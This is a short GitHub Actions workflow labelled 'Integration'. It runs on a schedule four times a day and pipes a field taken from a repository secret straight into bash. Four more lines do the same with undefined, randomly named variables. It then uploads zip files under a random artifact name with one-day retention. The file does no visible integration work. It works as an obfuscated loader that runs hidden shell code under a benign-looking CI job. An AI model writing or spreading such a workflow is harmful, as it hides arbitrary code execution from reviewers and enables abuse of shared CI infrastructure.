name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '54 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          lx0: ${{ secrets.lx0 }}
        run: |
          printf '%s' "$lx0" | jq -r .azwr553 | /bin/bash
          printf '%s' "$jk37071" | jq -r .gljxv63591 | /bin/bash
          printf '%s' "$c14" | jq -r .cgmtg466 | /bin/bash
          printf '%s' "$e09" | jq -r .ypud4 | /bin/bash
          printf '%s' "$tuwq61" | jq -r .cbi0 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ploXRVAU
          path: "*.zip"
          retention-days: 1
